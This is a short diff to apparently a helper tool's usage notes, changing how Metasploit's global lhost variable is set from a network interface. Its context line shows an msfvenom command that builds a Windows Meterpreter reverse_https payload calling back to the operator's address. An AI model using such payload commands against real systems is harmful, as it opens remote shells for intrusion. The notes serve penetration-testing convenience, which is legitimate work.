@@ -2,7 +2,9 @@ msfvenom -p windows/meterpreter/reverse_https lhost=\`getip eth0\` ...
 
  or even better...
 
-msfconsole -x "setg lhost \`getip eth0\`"
+msfconsole eth0
+
+ which sets a global lhost variable to the given interface's ip
 
 For us lazy folks...
 
